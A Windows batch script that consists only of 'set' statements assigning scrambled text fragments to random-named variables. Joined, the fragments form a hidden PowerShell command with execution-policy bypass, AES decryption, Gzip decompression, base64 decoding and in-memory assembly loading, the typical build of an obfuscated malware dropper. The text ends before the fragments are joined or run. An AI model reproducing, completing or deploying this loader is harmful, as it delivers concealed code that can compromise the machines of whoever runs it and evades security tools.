@echo off
set "HWuAXMdNYx=we"
set "asfBldbDWi=he"
set "mDcFcHqaMC=po"
set "HDDIRUJPmi=\W"
set "hVKlfIzLll=ll"
set "QNVqoXDfoG=Wi"
set "cwMhMjkozG=st"
set "NlAcBsaVNi=py"
set "fdlHQoLLVl=xe"
set "rBrHOqatvo=y "
set "NJJupagfez=em"
set "mwwfSbAJTz= /"
set "gscfPJGtth=\v"
set "rwWYrRPVvg=s\"
set "qvgEdGhMew=.e"
set "CRoVllYvGu=co"
set "LhXyUJVWfl=he"
set "cJiKbaEqdr=32"
set "wIkPUitBrQ=we"
set "KzQPqKXyvV=0\"
set "cHCGRIjTwU=ow"
set "DfcHFHaEYO=:\"
set "GAwPtgtIWC=in"
set "RGwqBGCmPe=rs"
set "FHKADMooQj=rS"
set "nYCiToQSoU=1."
set "EKmKdtiqSa= C"
set "YQgMxbpaVh=ll"
set "ETliYjgaCv=ws"
set "tVAQKtobfM=do"
set "wdewqSEDRR=nd"
set "QcclDAaFqN=Sy"
set "rqTWTCmsrU=Po"
set "nyaRqlbPEe=cd"
set "KiwriePZin= %~dp0"
set "kQYVJzkQTS=Disp"
set "bNZQusrMYq=ode]"
set "ThZOqwkPVK=NX);"
set "XOXFrlaqRr=;$xr"
set "kfMvnrVaEP=join"
set "xyxVXmqDHP=ZSEV"
set "LPDtkMXKsB=ing("
set "oehrQviMuv=brea"
set "KDCcgncAyM=trea"
set "NewWOpuJva=$ypz"
set "UkQrzujhWM=em.C"
set "hEwjzONlDG=..-1"
set "aAFyhxgJQX=gMod"
set "aMScXiRyFe=.Mem"
set "rMYcdnYzTm=esaB"
set "CLXhVPOpxu=ptog"
set "zrGrhqObCr=daeR"
set "alPWxkPLZV=.Len"
set "EVFujaHltD=.Mod"
set "CmNjeJqLmx=Disp"
set "dhniUtnMFi=.Sec"
set "WeRptCUuoU= = $"
set "VpMdjLdhnK=$ypz"
set "vzSLYIffDb=PKCS"
set "wAuUJDSQDr=X = "
set "khfWhKasYY=Syst"
set "ZCzKatWARd=ert]"
set "wKAwNHqYGH=comp"
set "fDqtpVofwy=ne);"
set "sGNTONamRo=raph"
set "OqAuuKjbZa=null"
set "NocCQGcUEx=cla."
set "FtBQlwuVuL=Secu"
set "GzSUSExxxh=dj0C"
set "tdPjTjaIGI=GCi."
set "FCNZwWtcuS=.Cre"
set "FyBZQxupxL=y.Pa"
set "zaceUqqYlG=ment"
set "xUAYegocOu=-joi"
set "xjRaGMMuIX=Rx.T"
set "RRVrXlCJEk=[-1."
set "LKGaZGJLZj=pStr"
set "hkgjmSJSOj=esMa"
set "GFaAJIdOIQ=;$CX"
set "PPmXthPbVS=mXNm"
set "EkbKTphLkI=zHhH"
set "CMSaSKnmwH= = N"
set "tSTbwIjmZu=ionM"
set "CJRjfkozTm=.Con"
set "rWXqCVFVtS=[IO."
set "VzXmAwotDK=($LS"
set "ZubqaWUzFE=.IO."
set "yUYblEVttz=('Tg"
set "sTQWpuWDzU=m(, "
set "FKBlxHqooB=('%*'"
set "cHsytTnGnj=ptog"
set "rdwrCIDCkO=)($C"
set "EjJOfYvUvO=).Sp"
set "FQCowAPiCr=mory"
set "eWxIneTdRt=7;$N"
set "AXGWDfYRPe=rofi"
set "CTyvnOBiQS=AgNX"
set "vMnRBCspcg=ion."
set "fpMmVtISpe=S46e"
set "qLyzNaOUom=mXNm"
set "gbuPxLWqZP=pose"
set "fjrcVswtcR= = $"
set "ioaLGPTNYG=, (,"
set "rjHiPHgGoo=;$xr"
set "wxvgJYyflA=);$x"
set "njAtWyzhYH= if "
set "CSuLMBSgEV=-1.."
set "viDdReSYIi=rtS4"
set "dvQFwbQEwj=and "
set "LnPbqsqdxa=ach "
set "ctfrpLmGpt=.Cop"
set "ZENTGnarZG=]::N"
set "rVTpzOWElo=New-"
set "cjjBOKqBZd=join"
set "pTgulDyVdK=ss -"
set "KtJyVYTlBK=);$P"
set "UirycCZlvO=ay()"
set "dUCEKYINUZ=.Cry"
set "JQyNEfNWdH=)($H"
set "zjZdpllhNu=Comp"
set "VnMAEQmfMN=$xrh"
set "hERwyLFPHE=iron"
set "MpixOuwrPj=-nop"
set "uHexDYfRms=6] -"
set "hqmLxioilc=gsYZ"
set "KdtKkyxzRp=ke($"
set "RxhGRMaIej=lBlo"
set "YkWkObscFX=]::("
set "IssnQkyTwc=bypa"
set "QAfnTgLJcr=AgNX"
set "wCGeHyHNYl=PxEW"
set "tdaXvqdbaS=.Ass"
set "SlTVOBGXxK=Bmor"
set "uxdAXudbXU=Comp"
set "dwaPnSNodX=in $"
